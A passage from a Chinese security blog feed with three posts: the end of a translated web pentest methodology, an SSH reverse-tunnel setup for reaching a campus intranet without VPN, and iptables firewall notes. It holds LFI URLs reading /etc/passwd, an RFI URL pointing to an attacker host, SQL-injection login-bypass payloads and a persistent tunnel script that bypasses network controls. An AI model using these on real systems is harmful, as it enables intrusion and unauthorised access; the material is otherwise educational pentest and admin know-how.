class="code"><pre><span class="line">http://vulnerable_host/preview.php?file=../../../../etc/passwd</span><br><span class="line">http://vulnerable_host/preview.php?file=../../../../etc/passwd%00</span><br></pre></td></tr></table></figure><h4 id="9-9-远程文件包含-RFI"><a href="#9-9-远程文件包含-RFI" class="headerlink" title="9.9 远程文件包含(RFI)"></a>9.9 远程文件包含(RFI)</h4><p>RFI指的是Web应用允许包含远程服务器上存在的文件。</p><p><a href="https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion" target="_blank" rel="noopener">OWASP-测试远程文件包含</a></p><ul><li>示例</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicous_page</span><br></pre></td></tr></table></figure><h3 id="10-逻辑漏洞"><a href="#10-逻辑漏洞" class="headerlink" title="10. 逻辑漏洞"></a>10. 逻辑漏洞</h3><p>想要发现逻辑漏洞，你必须对目标非常了解。只有你对目标的功能都是怎么使用有了了解后，你才能推想哪里有可利用的地方。测试逻辑漏洞时，可以回想作为普通用户是如何使用Web应用的功能的，是如何一步一步完成各种动作的，然后你要做的就是不按照这些步骤来。</p><p>此外，这时候也可以测试下输入一些不切实际的值。(比如一款健生app，用户输入自己的跑步里程)。</p><p>这时也可以测试<a href="https://www.owasp.org/index.php/Unrestricted_File_Upload" target="_blank" rel="noopener">非法文件上传</a>。</p><h3 id="11-加密算法漏洞"><a href="#11-加密算法漏洞" class="headerlink" title="11. 加密算法漏洞"></a>11. 加密算法漏洞</h3><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>SSLyze</td><td>TLS/SSL分析工具</td></tr></tbody></table><p>测试Web应用的TLS/SSL实现的质量，我推荐先去<a href="https://www.ssllabs.com/ssltest/" target="_blank" rel="noopener">这里</a>，如果搞不到，可以用<code>SSLyze</code>。</p><ul><li>示例</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslyze --regular www.example.com</span><br></pre></td></tr></table></figure><p>分析的目的可以归结为：</p><ol><li>目标是否使用了某种形式的加密手段。</li><li>目标使用的加密手段是否已经过时(TLS 1.2, SSL2/SSl3)。</li></ol><p>这时候也应该注意目标是否用了脆弱的加密算法(MD5,RC4等)，是否支持正向加密(译者注: 一次一密)等。</p><h3 id="12-拒绝服务"><a href="#12-拒绝服务" class="headerlink" title="12. 拒绝服务"></a>12. 拒绝服务</h3><p>拒绝服务是利用某种手段让目标无法为合法用户提供服务。拒绝服务的类型包括用户文件上传(上传巨大文件)到用户账户锁定(为了防止登录爆破)等。</p><p>如果存在载入很慢的页面或者是Ajax请求很卡，那么就意味着这个地方可能会被用于拒绝服务攻击。</p><h3 id="13-Flash漏洞"><a href="#13-Flash漏洞" class="headerlink" title="13. Flash漏洞"></a>13. Flash漏洞</h3><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>Firefox Developer Tools</td><td>Firefox浏览器自带的用于诊断、审计、调试客户端代码的工具</td></tr><tr><td>JPEXS (FFDec)</td><td>开源的SWF文件反汇编工具</td></tr></tbody></table><p>如果目标使用了flash或者其他的需要编译的客户端技术(如silverlight)，那么你应该下载下来然后利用<code>JPEXS FFDec</code>这样的反汇编工具来审计他们的源代码。如果你成功的对他们进行了逆向工程，你可能会发现一些隐藏的漏洞。</p><h2 id="0x04-测试Web服务"><a href="#0x04-测试Web服务" class="headerlink" title="0x04 测试Web服务"></a>0x04 测试Web服务</h2><p>Web服务用于机器之间的数据交换，他们应该用之前介绍的方法进行测试(Mapping-&gt;漏洞挖掘-&gt;漏洞利用)，可以用<code>Burp</code>对请求进行拦截，然后分析接口返回的数据。</p><h3 id="1-测试REST服务"><a href="#1-测试REST服务" class="headerlink" title="1. 测试REST服务"></a>1. 测试REST服务</h3><p>如果有文档的话，测试REST服务之前应该阅读它。当然，这通常是白盒测试或者是灰盒测试时的做法，或者你想更深入的进行测试时也可以这么做。</p><p>在黑盒测试过程中，我们可以用<code>burp</code>拦截请求和响应，观察<code>JSON</code>格式的响应信息来了解接口的作用，但是这个过程非常麻烦，不是很推荐。</p><p>因为REST使用<code>http</code>协议，所以我们也可以测试之前的一些漏洞比如SQLi和XSS。</p><p>测试REST服务时可以参考以下文章：</p><ul><li><p><a href="https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-" target="_blank" rel="noopener">https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-</a></p></li><li><p><a href="http://blog.isecurion.com/2017/10/10/penetration-testing-restful-web-services/" target="_blank" rel="noopener">http://blog.isecurion.com/2017/10/10/penetration-testing-restful-web-services/</a></p></li><li><p><a href="https://www.owasp.org/index.php/REST_Assessment_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/REST_Assessment_Cheat_Sheet</a></p></li></ul><h3 id="2-测试SOAP服务"><a href="#2-测试SOAP服务" class="headerlink" title="2. 测试SOAP服务"></a>2. 测试SOAP服务</h3><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>Wsdler (BApp)</td><td>可以解析WSDL文件，然后测试所有的允许的方法的请求</td></tr></tbody></table><p>尽管如今我在渗透测试中观察到REST服务比SOAP服务更多，但还是应该注意它。</p><p>基于SOAP的Web服务有一点很好，就是他是通过WSDL文件自描述的。你可以用<code>Wsdler (BApp)</code>这样的工具来解析WSDL文件，然后用<code>Burp Repeater</code>来发送测试请求。</p><p>和REST一样，我们也可以测试之前的一些漏洞比如SQLi和XSS。</p><ul><li><p>检查任何一个在mapping和漏洞挖掘时发现的和服务有关的路径</p><ul><li>比如，<a href="http://exampleapplication.com/service" target="_blank" rel="noopener">http://exampleapplication.com/service</a></li></ul></li><li><p>查看WSDL文件获取接口信息然后导入Burp</p></li><li><p>在Burp Proxy的历史标签页，把WSDL文件通过<code>Parse WSDL</code>右键选项加入到Wsdler扩展</p></li><li><p>发送测试请求给Repeater，观察服务如何工作</p></li></ul><p>测试SOAP服务时可以参考：</p><ul><li><a href="https://blog.netspi.com/hacking-web-services-with-burp/" target="_blank" rel="noopener">https://blog.netspi.com/hacking-web-services-with-burp/</a></li></ul><h2 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05 漏洞利用"></a>0x05 漏洞利用</h2><blockquote><p>在漏洞利用阶段，是利用之前发现的漏洞，评估他们影响范围与风险。</p></blockquote><p>简单来说，这一步就是查阅之前步骤中你所发现与记录的信息，尽可能深地利用发现的漏洞。有时在漏洞利用过程中，你可能需要更高的权限才能进行下去，这时你应该返回去，从mapping步骤开始重新迭代之前的过程。</p><p>下面是一些示例场景，但这一步是非常独特的。</p><h3 id="1-利用场景"><a href="#1-利用场景" class="headerlink" title="1. 利用场景"></a>1. 利用场景</h3><h3 id="2-利用XSS"><a href="#2-利用XSS" class="headerlink" title="2. 利用XSS"></a>2. 利用XSS</h3><h4 id="2-1-浏览器劫持"><a href="#2-1-浏览器劫持" class="headerlink" title="2.1 浏览器劫持"></a>2.1 浏览器劫持</h4><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>BeEF</td><td>基于web的XSS平台</td></tr></tbody></table><p>如果你发现目标应用确实存在XSS漏洞，这时你可以试试是否可以用<code>BeEF</code>这样的工具来控制目标浏览器。</p><p>可以参考<a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-hack-web-browsers-with-beef-0159961/" target="_blank" rel="noopener">这篇</a>。</p><p>你可以使用自己的浏览器来验证XSS漏洞的危害性当你向客户展示你发现的XSS漏洞时。</p><h3 id="3-利用SQLi"><a href="#3-利用SQLi" class="headerlink" title="3. 利用SQLi"></a>3. 利用SQLi</h3><h4 id="3-1-数据提取"><a href="#3-1-数据提取" class="headerlink" title="3.1 数据提取"></a>3.1 数据提取</h4><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>SQLMap</td><td>自动化的SQLi工具，可以检测和利用基于许多流行的关系型数据库的SQL注入漏洞</td></tr></tbody></table><p>如果目标存在SQLi且为了提取数据，<code>SQLMap</code>是首选。</p><p><a href="http://sqlmap.org/" target="_blank" rel="noopener">SQLMap</a>官网有详细的教程，我推荐你仔细看看。</p><h4 id="3-2-离线密码爆破"><a href="#3-2-离线密码爆破" class="headerlink" title="3.2 离线密码爆破"></a>3.2 离线密码爆破</h4><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>Hashcat</td><td>世界上最快最先进的密码恢复工具</td></tr></tbody></table><p>当你得到目标应用账户的密码时，可以尝试这个。</p><p>如果密码用了哈希算法加密，你可以用<code>hashcat</code>结合一个好的字典比如<code>rockyou.txt</code>来恢复密码。可以看<a href="https://www.alpinesecurity.com/blog/offline-password-cracking-the-attack-and-the-best-defense-against-it" target="_blank" rel="noopener">这篇</a>。</p><p>毋庸置疑，这将是您在渗透测试结束时可以为客户带来的最大发现之一。</p><h4 id="3-3-认证绕过"><a href="#3-3-认证绕过" class="headerlink" title="3.3 认证绕过"></a>3.3 认证绕过</h4><p>你可以尝试利用SQLi来提升自己的权限。网上有很多关于此的文章，下面这些payload你可以尝试在一些脆弱的表单里输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; --</span><br><span class="line">admin&apos; #</span><br><span class="line">admin&apos;/*</span><br><span class="line">admin&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">admin&apos; or &apos;1&apos;=&apos;1&apos;--</span><br><span class="line">admin&apos; or &apos;1&apos;=&apos;1&apos;#</span><br><span class="line">admin&apos; or &apos;1&apos;=&apos;1&apos;/*</span><br><span class="line">admin&apos;or 1=1 or &apos;&apos;=&apos;</span><br><span class="line">admin&apos; or 1=1</span><br></pre></td></tr></table></figure><h3 id="4-跨站请求伪造-CSRF"><a href="#4-跨站请求伪造-CSRF" class="headerlink" title="4. 跨站请求伪造(CSRF)"></a>4. 跨站请求伪造(CSRF)</h3><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>Burp: Generate CSRF PoC</td><td>用于生成CSRF Poc的Burp模块</td></tr></tbody></table><p>如果目标存在CSRF漏洞(<code>Burp Scanner</code>会发现)，你可以用<code>Generate CSRF PoC</code>来验证是否真的存在。</p><p>可以看<a href="https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-" target="_blank" rel="noopener">这篇</a>教程。</p><p>大概就下面这样：</p><ol><li>拦截一个HTTP请求(通常是修改账户信息的)</li><li>在Burp中右键</li><li>Generating the CSRF PoC(修改一些请求体的信息)</li><li>保存poc到一个html文件</li><li>打开html文件并点击提交</li><li>验证信息是否被恶意篡改</li></ol><h2 id="0x00-结尾"><a href="#0x00-结尾" class="headerlink" title="0x00 结尾"></a>0x00 结尾</h2><p>感谢阅读。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;本篇翻译自&lt;a href=&quot;https://jdow.io/blog/2018/03/18/web-application-penetration-testing-methodology/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;这里&lt;/a&gt;
      
    
    </summary>
    
    
      <category term="WEB" scheme="http://lxzmads.github.io/tags/WEB/"/>
    
      <category term="翻译" scheme="http://lxzmads.github.io/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>一种利用原生SSH实现代理反弹的思路</title>
    <link href="http://lxzmads.github.io/2018/07/10/%E4%B8%80%E7%A7%8D%E5%88%A9%E7%94%A8%E5%8E%9F%E7%94%9FSSH%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E5%8F%8D%E5%BC%B9%E7%9A%84%E6%80%9D%E8%B7%AF/"/>
    <id>http://lxzmads.github.io/2018/07/10/一种利用原生SSH实现代理反弹的思路/</id>
    <published>2018-07-09T16:00:00.000Z</published>
    <updated>2019-08-02T08:48:22.418Z</updated>
    
    <content type="html"><![CDATA[<p>这两天闲来无事，翻看ssh的man pages，发现ssh的DESCRIPTION最后有一句很不起眼的话<code>X11 connections, arbitrary TCP ports and UNIX-domain sockets can also be forwarded over the secure channel.</code>意思就是可以做端口转发咯。再结合最近开会校园的网站只能从校园网或者连VPN才能访问，于是就想看看有没有办法突破一下。</p><blockquote><p>DESCRIPTION<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ssh (SSH client) is a program for logging into a remote machine and for executing commands on a remote machine.  It is intended to provide secure encrypted communications between two untrusted hosts over an insecure network.  X11 connections, arbitrary TCP ports and UNIX-domain sockets can also be forwarded over the secure channel.</p></blockquote><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>由于做一些老师的项目，老师给了校内的两台虚拟主机，校内主机自然可以访问所有学校的网站，而且也是可以连通外网的。除此之外我还有一台腾讯云的1元云主机，可以连外网，连不上校内网，打算用这台作为代理跳板机。</p><table><thead><tr><th>设备</th><th>是否能访问外网</th><th>是否能访问内网</th></tr></thead><tbody><tr><td>XMU VM 1</td><td>是</td><td>是</td></tr><tr><td>XMU VM 2</td><td>是</td><td>是</td></tr><tr><td>Cloud VM</td><td>是</td><td>否</td></tr></tbody></table><h1 id="思路整理"><a href="#思路整理" class="headerlink" title="思路整理"></a>思路整理</h1><p>想连上校内的网站，肯定要有一条和校内网的通路。可以开启一条SSH Tunnel来做到。数据可以经过加密在这条隧道来回穿梭。数据传过去还不行，我们需要访问到内网其他主机的资源，自然就需要一台类似于代理服务器的服务器。刚好SSH还有一个动态端口转发的功能，实则就是在SSH Server端实现了一个Socks的代理，然后再在本地做一个远程端口转发。于是利用远程端口转发+动态端口转发，理论上可以做到实现我不用VPN以及校园网访问校内网站的目的！</p><h1 id="动手"><a href="#动手" class="headerlink" title="动手"></a>动手</h1><p>未方便表达，以下内容中，校园内的虚拟服务器称为host2，腾讯云称为host1。</p><h2 id="Step-1-建立Socks服务"><a href="#Step-1-建立Socks服务" class="headerlink" title="Step 1 建立Socks服务"></a>Step 1 建立Socks服务</h2><p>先坐在寝室，连上VPN，登录host2。开启一个本地的动态端口转发，用它充当Socks代理。先看看参数介绍：</p><blockquote><p>-D [bind_address:]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Specifies a local “dynamic” application-level port forwarding.  This works by allocating a socket to listen to port on the local side, optionally bound to the specified bind_address.  Whenever a connection is made to this port, the connection is forwarded over the secure channel,and the application protocol is then used to determine where to connect to from the remote machine.  Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh will act as a SOCKS server.  Only root can forward privileged ports.  Dynamic port forwardings can also be specified in the configuration file.</p></blockquote><p>其中SSH Server填127.0.0.1，这样就可以实现本地动态端口转发，使得本地成为一个Socks代理。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -Nf -D 7001 root@127.0.0.1</span><br></pre></td></tr></table></figure><blockquote><p>-N &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Do not execute a remote command.  This is useful for just forwarding ports.<br>-f &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Requests ssh to go to background just before command execution.  This is useful if ssh is going to ask for passwords or passphrases, but the user wants it in the background.</p></blockquote><p>这看起来很鸡肋，因为当浏览器设置localhost:7001为代理时，请求经过代理后却还是通过本地网卡发送出去，所以似乎没什么用。当然还没完。<br>值得一提的是，这样做了动态端口转发后的端口是暴露在公网上的，最起码同一网段的主机也可以配置使用这个代理。</p><h2 id="Step-2-远程端口转发"><a href="#Step-2-远程端口转发" class="headerlink" title="Step 2 远程端口转发"></a>Step 2 远程端口转发</h2><p>继续在host2上操作，前面已经建立了一个本地的socks5代理服务，接着再建立一个远程端口转发，把本地的socks代理服务通过ssh tunnel发送到host1上。因为host2可以连上host1，而host1连不上host2，所以必须采用远程端口转发。关于远程端口转发与本地端口转发的区别，可以看<a href="https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/" target="_blank" rel="noopener">这里</a>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -Nf -R 8888:127.0.0.1:7001 mads@123.206.176.*</span><br></pre></td></tr></table></figure><p>这样就打通了host1与host2，并且在host1上可以通过本地的8888端口访问host2的socks代理服务。到这里似乎一切都完成了，但实际配置之后发现访问不了。原因是目前只能在host1的本地访问host2的socks代理，所以还需要在host1上做一个本地端口转发把8888端口对应的服务暴露到公网上。</p><h2 id="Step-3-本地端口转发"><a href="#Step-3-本地端口转发" class="headerlink" title="Step 3 本地端口转发"></a>Step 3 本地端口转发</h2><p>在host1上做本地端口转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -Nfg -L 6666:localhost:8888 mads@127.0.0.1</span><br></pre></td></tr></table></figure><blockquote><p>-g &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Allows remote hosts to connect to local forwarded ports.  If used on a multiplexed connection, then this option must be specified on the master process.</p></blockquote><p>关键就是这个 -g 参数，从介绍可以知道他可以允许远程的主机访问本地转发的端口。<br>还有一个值得说的就是命令里面的localhost指的是相对于SSH Server，但这里都是host1。<br>这样所有工作完成。</p><p>这时host2应该已经是监听了7001端口的Socks服务，以及监听了ssh tunnel的端口22。host1上有本地端口转发监听的6666端口以及远程端口转发开启的用于连接host2的socks服务的8888端口。</p><p>这一套组合拳打下来，就实现了穿透内网的功能。如果ssh原本地动态端口转发叫做本地端口转发，那么我想叫这种方法为远程动态端口转发。</p><h1 id="增强"><a href="#增强" class="headerlink" title="增强"></a>增强</h1><p>以上步骤都没问题，但是SSH提供的远程端口转发会超时自动关闭，所以需要写一个守护进程。也可以用一个现成的autossh代替ssh实现就行了。也可以用下面的脚本示例：</p><ul><li>revrocket.sh</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line">ps aux | grep fsocks5 | grep -v grep | awk <span class="string">'&#123;print $2&#125;'</span> | xargs <span class="built_in">kill</span> -9 2&gt;/dev/null</span><br><span class="line">ps aux | grep 61080 | grep mads | awk <span class="string">'&#123;print $2&#125;'</span> | xargs <span class="built_in">kill</span> -9 2&gt;/dev/null</span><br><span class="line">bash /data/mads/fsocks5.sh &amp;</span><br></pre></td></tr></table></figure><ul><li>fsocks5.sh</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># This script forward local socks5 port.</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  START=$(date +%s)</span><br><span class="line">  ssh -NTD 61080 root@127.0.0.1 &amp; 2&gt;/dev/null</span><br><span class="line">  ssh -NTR 61080:127.0.0.1:61080 -o ServerAliveInterval=10 -o ExitOnForwardFailure=yes mads@xxx 2&gt;/dev/null</span><br><span class="line">  END=$(date +%s)</span><br><span class="line">  DIFF=$(( <span class="variable">$END</span> - <span class="variable">$START</span> ))</span><br><span class="line">  <span class="keyword">if</span> (( <span class="variable">$DIFF</span> &lt; 3 ))</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line">    sleep 60</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>然后再在系统的例行任务中加入此脚本，以实现开机启动啦～</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="comment"># centos</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"bash /data/mads/revrocket.sh"</span> &gt;&gt; /etc/rc.local</span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这两天闲来无事，翻看ssh的man pages，发现ssh的DESCRIPTION最后有一句很不起眼的话&lt;code&gt;X11 connections, arbitrary TCP ports and UNIX-domain sockets can also be forwar
      
    
    </summary>
    
    
      <category term="捣鼓" scheme="http://lxzmads.github.io/tags/%E6%8D%A3%E9%BC%93/"/>
    
      <category term="反向代理" scheme="http://lxzmads.github.io/tags/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
    
      <category term="远程动态端口转发" scheme="http://lxzmads.github.io/tags/%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>IPTABLES 小计</title>
    <link href="http://lxzmads.github.io/2018/06/26/IPTABLES%E5%B0%8F%E8%AE%A1/"/>
    <id>http://lxzmads.github.io/2018/06/26/IPTABLES小计/</id>
    <published>2018-06-25T16:00:00.000Z</published>
    <updated>2019-04-01T13:56:51.000Z</updated>
    
    <content type="html"><![CDATA[<p>写这篇小计的原因呢，主要是在学校做项目或者自己在Linux服务器搭点什么服务的时候，总是因为各种原因Unreachable，并且找了半天原因最终发现是Linux的防火墙策略导致。之前都是稀里糊涂的为了服务赶紧上线，登录某某云控制台或者复制网上的代码修改服务器的防火墙策略，但总感觉不是办法。趁现在有点时间，就打算看个明白，顺便写个小计记录一下方便快速复习。</p><blockquote><p>Update: 2019-03-29<br>最近做毕设搭建docker网络的时候又要用到iptables，回头看到以前写过的小计感觉写的不是很清楚，于是更新一下。</p></blockquote><h1 id="何为？"><a href="#何为？" class="headerlink" title="何为？"></a>何为？</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>iptables是运行在Linux用户空间的工具，通过它可以修改运行在内核空间的防火墙模块Netfilter的配置，从而达到配置Linux防火墙策略的目的。所以Netfilter才是Linux真正的防火墙模块，而iptables只是与模块交互的前端工具，而且iptables只是针对IPv4报文的。类似的ip6tables(IPv6)、arptables(ARP)、ebtables(Ethernet Frame)这里不做介绍。</p><blockquote><p>Update: iptables新版本的部分表是支持IPv6的了。这里说它是前端工具并不妥当，它严格个说可以是个利用netfilter framework的hook机制实现的防火墙软件</p></blockquote><h2 id="Tables"><a href="#Tables" class="headerlink" title="Tables"></a>Tables</h2><p>前面说到iptables修改的是内核空间模块Netfilter的配置文件，这些配置文件称为Tables。Tables一共有5张，分别对应着5个Netfilter的子模块(按优先级)：</p><blockquote><p>Update: 其实tables是iptables的配置文件。tables其实就是对应于你想做什么（organized by area of concern），而Chain对应于什么时候做。Chain和内核中Netfilte的5个hook是一一对应的。</p></blockquote><ul><li>PREROUTING: Triggered by the NF_IP_PRE_ROUTING hook.</li><li>INPUT: Triggered by the NF_IP_LOCAL_IN hook.</li><li>FORWARD: Triggered by the NF_IP_FORWARD hook.</li><li>OUTPUT: Triggered by the NF_IP_LOCAL_OUT hook.</li><li><p>POSTROUTING: Triggered by the NF_IP_POST_ROUTING hook.</p></li><li><p>iptables_raw 模块，对应的是raw表。优先级最高，主要用途是结合NOTRACK target避免<a href="https://en.wikipedia.org/wiki/Netfilter" target="_blank" rel="noopener">Connection Tracking</a>。target的含义见下文。</p></li><li>iptables_mangle 模块，对应mangle表。用于修改定义修改数据包的规则。它作用在Connection Tracking之后。</li><li>iptables_nat 模块，对应nat表。主要用于NAT转换，而不是为了过滤目的。</li><li>iptables_filter 模块，对应filter表。用于常规的过滤规则。</li><li>security_filter 模块，对应security表。用于定义安全规则。</li></ul><p><del>这些模块按照一定的优先级对传入本机的数据包按照对应的表中的规则进行过滤、转发。那么这些表中的内容是什么样子呢？</del></p><p><del>其实各个表又包含了不同的子模块，这些子模块称为Chain。其实Tables和Chain是<strong>n-n</strong>的关系。下面介绍Chain。</del></p><h2 id="Chain"><a href="#Chain" class="headerlink" title="Chain"></a>Chain</h2><p>Chain是Rules的Chain，那么Rules是什么呢？Rules就是一系列的Rule，Rule包含数据包的匹配条件和匹配结果，即“满足什么样条件的数据包怎么处理”。而一系列这样的Rule按照链组织起来，就是一个Chain。Linux内核中有<strong>五条</strong>预定义的Chain，分别是：</p><ul><li>PREROUTING：数据包从网卡传入缓存中后路由（判断IP地址是否是本机）之前的数据包经过这条链。</li><li>INPUT：路由后IP地址是本机，即将交给应用层socket的数据包经过这条链。</li><li>FORWARD：路由后IP地址不是本机的数据包经过此链。</li><li>OUTPUT：从本机socket发出的数据包经过此链。</li><li>POSTROUTING：即将交给网卡发送出去的数据包经过此链。</li></ul><p>除了这五条预定义的Chain之外，用户可以定义任意条自己的Chain。</p><p>前面提到Rule包含一个Target，这个Target可以是跳转用户自己定义的Chain，或者是特殊的Target(ACCEPT, DROP, RETURN)，或者是Target的取值集合（man iptables-extensions）。预定义的5条链都有默认的一个<strong>policy Target</strong>，都是<strong>ACCEPT</strong>。数据包经过Chain时，会从第一条Rule开始匹配，如果不匹配交给下一个Rule，如果到达Chain尾，就按默认的policy Target处理。如果匹配了就按Rule中的Target处理。关于各个Target的作用详细的看iptables-extensions的manpage。</p><p>Chain可以为空(默认情况)，数据包通过本机最起码经过<strong>一条</strong>Chain。</p><blockquote><p>Update: netfilter的hook只有五个，但是会有多个表的Chain注册到一个hook，所以需要提供一个hook优先级来确定hook执行顺序。</p></blockquote><h2 id="Target-记录"><a href="#Target-记录" class="headerlink" title="Target 记录"></a>Target 记录</h2><p>最近被一个问题困扰了好久，最终还是解决了。 问题就是，我在一台有一张无线网卡的Ubuntu台式机<code>vs</code>上开了个热点，然后再在<code>vs</code>上开个<code>nginx</code>docker映射<code>80</code>端口到<code>vs</code>的<code>8888</code>，发现台式机热点的局域网内访问docker的话，nginx访问日志里记录的都是<code>172.x.0.1</code>，也就是docker网关的ip。</p><p>问题所在： Ubuntu开热点时在iptables的nat表中添加了下面这样一条规则导致：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A POSTROUTING -s 10.42.0.0/24 ! -d 10.42.0.0/24 -j MASQUERADE</span><br></pre></td></tr></table></figure><p>具体原理日后有时间专门写一篇8。</p><h1 id="如何？"><a href="#如何？" class="headerlink" title="如何？"></a>如何？</h1><p>说了这么多原理，该是实作的时候了。其实iptables的用法在man pages里面写的很清楚了，可以去翻阅学习。这里记录下一些常用的做法。</p><h2 id="只开放指定端口"><a href="#只开放指定端口" class="headerlink" title="只开放指定端口"></a>只开放指定端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">iptables -F</span><br><span class="line">iptables -I INPUT -i lo -j ACCEPT <span class="comment"># 允许本机访问本机</span></span><br><span class="line">iptables -I INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT <span class="comment"># 允许本机访问外部网络</span></span><br><span class="line">iptables -I INPUT -p tcp --dport 80 -j ACCEPT <span class="comment"># http</span></span><br><span class="line">iptables -I INPUT -p tcp --dport 443 -j ACCEPT <span class="comment"># https</span></span><br><span class="line">iptables -I INPUT -p tcp --dport 2333 -j ACCEPT <span class="comment"># ssr-.-</span></span><br><span class="line">iptables -I INPUT -p tcp --dport 10:21 -j ACCEPT <span class="comment"># 常见系统服务端口</span></span><br><span class="line">iptables -I INPUT -p tcp --dport 22 -j ACCEPT <span class="comment"># ssh</span></span><br><span class="line">iptables -I INPUT -p icmp -j ACCEPT <span class="comment"># 允许ping</span></span><br><span class="line">iptables -A INPUT -j REJECT <span class="comment"># 拒绝所有其他端口</span></span><br></pre></td></tr></table></figure><h2 id="防止SYN洪水攻击"><a href="#防止SYN洪水攻击" class="headerlink" title="防止SYN洪水攻击"></a>防止SYN洪水攻击</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 100 -j REJECT</span><br></pre></td></tr></table></figure><h2 id="防止DDOS攻击"><a href="#防止DDOS攻击" class="headerlink" title="防止DDOS攻击"></a>防止DDOS攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 并发请求限制</span><br><span class="line">iptables -I INPUT -p tcp --dport 80 -s 10.10.10.1 -m connlimit --connlimit-above 10 -j REJECT</span><br><span class="line"># limit模块，限速控制异常流量</span><br><span class="line">iptables -A INPUT -p icmp -m limit --limit 3/hour --limit-burst 10 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p icmp -j 